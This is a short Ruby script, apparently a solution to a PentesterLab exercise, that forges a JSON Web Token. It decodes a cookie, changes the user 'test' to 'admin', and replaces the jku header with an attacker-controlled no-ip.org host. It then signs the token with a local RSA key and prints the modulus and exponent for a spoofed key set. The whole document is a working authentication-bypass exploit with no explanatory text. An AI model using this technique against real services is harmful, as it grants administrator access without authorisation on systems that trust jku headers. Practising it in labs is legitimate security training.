require 'uri'
require 'base64'
require 'openssl'
require 'json'

cookie = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.MBMDAWYiCeYQdiqyDQXDGHiQK4GJWU-z0Lf2eJoaYEUSWDH7XgWgFPXSHuU7mFxk9qXrx4xVqHBXJ4otD9AkUgdL-fguh55cexgutZPoZUIjLXh9mCPuG4pUXxpz0hUY8AyMd8IcB-_pjDcphWZPzP8iFm2VBYmcf8ojIYlXyvTn2Ms2te_YhYoBKiDgtm0gOcbt9v-DA4tF0kjfWT51exkqfZT37ZHBcA_vu5MyhJpbvFnWJnsAPZZUDDMvGkI7ZAauiPgxX5Td5oROSxCFjRzbKV9-y53HEqVkA2t-GpTbDNVqKUa09lPkxwKkUA0gSIHuZH6mSVRakKQEVgzQtQ'

header, payload, signature = cookie.split('.')

decoded_header = Base64.decode64(header)
decoded_payload = Base64.decode64(payload)

decoded_payload.gsub!("test","admin")
decoded_header.gsub!("https://pentesterlab.com/.well-known/jwks.json", "http://bennettscash.no-ip.org/jwks.json")

puts decoded_header
puts decoded_payload

token = Base64.urlsafe_encode64(decoded_header).gsub("=","") + "." + Base64.urlsafe_encode64(decoded_payload).gsub("=", "")

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts "n: " + n
puts "e: " + e

sign = priv.sign("SHA256", token)
puts token +"." + Base64.urlsafe_encode64(sign).gsub(/=+$/, "")

